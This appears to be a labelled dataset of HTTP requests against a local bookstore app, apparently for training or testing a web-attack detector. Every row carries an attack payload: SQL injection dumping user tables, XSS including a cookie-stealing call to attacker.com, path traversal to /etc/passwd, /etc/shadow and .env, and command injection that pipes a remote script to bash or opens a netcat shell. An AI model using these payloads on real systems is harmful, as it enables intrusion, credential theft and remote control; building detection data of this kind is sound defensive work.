method,path,query_params,headers,body,client_ip,user_agent,label,attack_type
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""python-requests/2.31.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1%7C%20%24%28cat%20/etc/passwd%29""}",192.168.1.151,python-requests/2.31.0,4,CMD
POST,/contact/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""curl/8.4.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""name"": ""<video src=1 onerror=alert(1)>"", ""email"": ""attacker@evil.com"", ""subject"": ""Hỏi đáp bảo mật"", ""message"": ""<video src=1 onerror=alert(1)>""}",192.168.1.210,curl/8.4.0,2,XSS
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Go-http-client/1.1"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1; echo d2hvYW1p | base64 -d | sh""}",192.168.1.105,Go-http-client/1.1,4,CMD
GET,/static/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fvar/log/syslog,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Wget/1.21.3"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,192.168.1.152,Wget/1.21.3,3,PATH
POST,/rate/6/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Wget/1.21.3"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""score"": 5, ""comment"": ""<script>fetch('http://attacker.com', {body: document.cookie})</script>""}",172.16.5.55,Wget/1.21.3,2,XSS
GET,/api/v1/vulnerable/files/download/,file=\etc\passwd,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,192.168.1.105,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,3,PATH
POST,/rate/21/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""sqlmap/1.7.11#stable (https://sqlmap.org)"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""score"": 5, ""comment"": ""<audio src=1 onerror=alert(1)>""}",198.51.100.77,sqlmap/1.7.11#stable (https://sqlmap.org),2,XSS
POST,/rate/42/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Wget/1.21.3"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""score"": 5, ""comment"": ""<input type='text' autofocus onfocus=ALERT(1)>""}",10.0.0.99,Wget/1.21.3,2,XSS
GET,/api/v1/vulnerable/reviews/,"book_id=""/onmouseover=""alert(1)""","{""Host"": ""localhost:8000"", ""User-Agent"": ""Go-http-client/1.1"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,192.168.1.210,Go-http-client/1.1,2,XSS
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Nikto/2.1.6"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1; $($(id))""}",10.0.0.99,Nikto/2.1.6,4,CMD
POST,/rate/32/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""score"": 5, ""comment"": ""&#x3C;img src='invalid' onerror='alert(\""XSS\"")'&#x3E;""}",10.0.0.88,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",2,XSS
GET,/books/,category=' OR 5-2=3--,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Wget/1.21.3"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,192.168.1.152,Wget/1.21.3,1,SQLI
GET,/orders/20/invoice.pdf,template=../../../../etc/passwd,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Go-http-client/1.1"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,172.16.4.12,Go-http-client/1.1,3,PATH
GET,/books/,category=admin' --,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,198.51.100.23,Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),1,SQLI
GET,/orders/18/invoice.pdf,template=%252e%252e%252f%252e%252e%252fmanage.py,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Nikto/2.1.6"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,10.0.0.99,Nikto/2.1.6,3,PATH
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""curl/8.4.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1%7C%20ps%20aux""}",192.168.1.151,curl/8.4.0,4,CMD
GET,/static/..\..\..\..\windows\win.ini,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Go-http-client/1.1"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,192.168.1.152,Go-http-client/1.1,3,PATH
POST,/contact/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""name"": ""<input type='text' autofocus onfocus=alert(1)>"", ""email"": ""attacker@evil.com"", ""subject"": ""Hỏi đáp bảo mật"", ""message"": ""<input type='text' autofocus onfocus=alert(1)>""}",198.51.100.77,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",2,XSS
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Wget/1.21.3"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1; $(`whoami`)""}",198.51.100.23,Wget/1.21.3,4,CMD
GET,/api/v1/vulnerable/files/download/,file=../../bookstore/settings/base.py%00.pdf,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,192.168.1.200,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",3,PATH
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Wget/1.21.3"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1&& uname -a""}",172.16.4.12,Wget/1.21.3,4,CMD
POST,/rate/32/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""score"": 5, ""comment"": ""<script>alert(1)</script>""}",172.16.5.55,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",2,XSS
GET,/books/,category=' OR '1'='1,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,192.168.1.151,Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),1,SQLI
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1| ipconfig /all""}",192.168.1.200,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",4,CMD
GET,/api/v1/vulnerable/reviews/,"book_id=<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>","{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,198.51.100.23,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",2,XSS
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1&& curl http://attacker.com/shell.sh | bash""}",198.51.100.77,Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),4,CMD
POST,/api/v1/vulnerable/reviews/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Nikto/2.1.6"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""book_id"": 17, ""rating"": 5, ""review_text"": ""Sách hay! javaSCRIpT:AlErt(document.domain)""}",10.0.0.99,Nikto/2.1.6,2,XSS
POST,/api/v1/vulnerable/auth/login/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""username"": ""1' UNION SELECT null, tbl_name, null, null FROM sqlite_master--"", ""password"": ""123456""}",172.16.5.55,Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),1,SQLI
GET,/orders/6/invoice.pdf,template=%2e%2e/%2e%2e/%2e%2e/etc/hosts,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Nikto/2.1.6"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,192.168.1.151,Nikto/2.1.6,3,PATH
GET,/api/v1/vulnerable/books/search/,q=1' ORDER BY 10--,"{""Host"": ""localhost:8000"", ""User-Agent"": ""sqlmap/1.7.11#stable (https://sqlmap.org)"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,192.168.1.105,sqlmap/1.7.11#stable (https://sqlmap.org),1,SQLI
GET,/api/v1/vulnerable/files/download/,file=../../../../boot.ini,"{""Host"": ""localhost:8000"", ""User-Agent"": ""curl/8.4.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,10.0.0.88,curl/8.4.0,3,PATH
GET,/orders/4/invoice.pdf,template=../../etc/shadow,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Wget/1.21.3"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,198.51.100.77,Wget/1.21.3,3,PATH
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""python-requests/2.31.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1%3B%20whoami""}",10.0.0.99,python-requests/2.31.0,4,CMD
POST,/api/v1/vulnerable/auth/login/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Wget/1.21.3"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""username"": ""' OR '1'='1"", ""password"": ""password""}",10.0.0.99,Wget/1.21.3,1,SQLI
POST,/api/v1/vulnerable/reviews/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""book_id"": 46, ""rating"": 5, ""review_text"": ""Sách hay! <script>alert(1)</script>""}",192.168.1.105,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",2,XSS
GET,/orders/7/invoice.pdf,template=....//....//....//.env,"{""Host"": ""localhost:8000"", ""User-Agent"": ""sqlmap/1.7.11#stable (https://sqlmap.org)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,192.168.1.151,sqlmap/1.7.11#stable (https://sqlmap.org),3,PATH
GET,/api/v1/vulnerable/books/search/,"q='/**/UNION/**/SELECT/**/null,/**/username,/**/password,/**/null/**/FROM/**/auth_user--","{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,192.168.1.105,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",1,SQLI
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""curl/8.4.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1; echo d2hvYW1p | base64 -d | sh""}",10.0.0.88,curl/8.4.0,4,CMD
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1%7C%20id""}",192.168.1.210,Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),4,CMD
GET,/books/,category=admin' --,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Go-http-client/1.1"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,10.0.0.88,Go-http-client/1.1,1,SQLI
POST,/contact/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Nikto/2.1.6"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""name"": ""<iframe src='javascript:alert(1)'></iframe>"", ""email"": ""attacker@evil.com"", ""subject"": ""Hỏi đáp bảo mật"", ""message"": ""<iframe src='javascript:alert(1)'></iframe>""}",10.0.0.88,Nikto/2.1.6,2,XSS
GET,/api/v1/vulnerable/files/download/,file=../../manage.py,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Nikto/2.1.6"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,192.168.1.150,Nikto/2.1.6,3,PATH
POST,/contact/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Nikto/2.1.6"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""name"": ""<imG src='invalid' oNeRror='alErt(\""XSS\"")'>"", ""email"": ""attacker@evil.com"", ""subject"": ""Hỏi đáp bảo mật"", ""message"": ""<imG src='invalid' oNeRror='alErt(\""XSS\"")'>""}",10.0.0.88,Nikto/2.1.6,2,XSS
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1; $(id)""}",198.51.100.77,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",4,CMD
GET,/api/v1/vulnerable/files/download/,file=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/hosts,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Wget/1.21.3"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,192.168.1.151,Wget/1.21.3,3,PATH
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Nikto/2.1.6"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1%3B%20nc%20-e%20/bin/sh%2010.0.0.1%204444""}",192.168.1.151,Nikto/2.1.6,4,CMD
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Go-http-client/1.1"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1; netstat -an""}",172.16.4.12,Go-http-client/1.1,4,CMD
GET,/books/,category='/**/OR/**/1=1#,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Go-http-client/1.1"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,10.0.0.88,Go-http-client/1.1,1,SQLI
GET,/api/v1/vulnerable/files/download/,file=%252e%252e%252f%252e%252e%252fmanage.py,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Nikto/2.1.6"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,172.16.4.12,Nikto/2.1.6,3,PATH
GET,/api/v1/vulnerable/books/search/,"q=1/**/UN/**/ION/**/SE/**/LECT/**/1,/**/sqlite_version(),/**/3,/**/4--","{""Host"": ""localhost:8000"", ""User-Agent"": ""Wget/1.21.3"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,192.168.1.200,Wget/1.21.3,1,SQLI
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""curl/8.4.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1%26%26%20uname%20-a""}",203.0.113.45,curl/8.4.0,4,CMD
POST,/api/v1/vulnerable/auth/login/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Wget/1.21.3"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""username"": ""' OR '1'='1"", ""password"": ""password""}",172.16.5.55,Wget/1.21.3,1,SQLI
GET,/static/../../../../var/log/syslog,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Wget/1.21.3"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,172.16.4.12,Wget/1.21.3,3,PATH
POST,/contact/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""name"": ""javascript:prompt(1)"", ""email"": ""attacker@evil.com"", ""subject"": ""Hỏi đáp bảo mật"", ""message"": ""javascript:prompt(1)""}",198.51.100.77,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,2,XSS
GET,/api/v1/vulnerable/books/search/,q=admin' #,"{""Host"": ""localhost:8000"", ""User-Agent"": ""python-requests/2.31.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,192.168.1.150,python-requests/2.31.0,1,SQLI
GET,/api/v1/vulnerable/files/download/,file=%252e%252e%252f%252e%252e%252fmanage.py,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Nikto/2.1.6"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,198.51.100.23,Nikto/2.1.6,3,PATH
POST,/api/v1/vulnerable/auth/login/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Wget/1.21.3"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""username"": ""' OR 2>1 --"", ""password"": """"}",192.168.1.150,Wget/1.21.3,1,SQLI
POST,/api/v1/vulnerable/auth/login/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""username"": ""'; SELECT pg_sleep(5);--"", ""password"": ""password""}",192.168.1.150,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",1,SQLI
GET,/static/..///..///data/waf_security.db,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Nikto/2.1.6"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,192.168.1.150,Nikto/2.1.6,3,PATH
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1|$IFSps$IFSaux""}",198.51.100.77,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,4,CMD
GET,/static/../../data/waf_security.db,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""curl/8.4.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,192.168.1.151,curl/8.4.0,3,PATH
GET,/static//etc/passwd%00.pdf,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""curl/8.4.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,10.0.0.99,curl/8.4.0,3,PATH
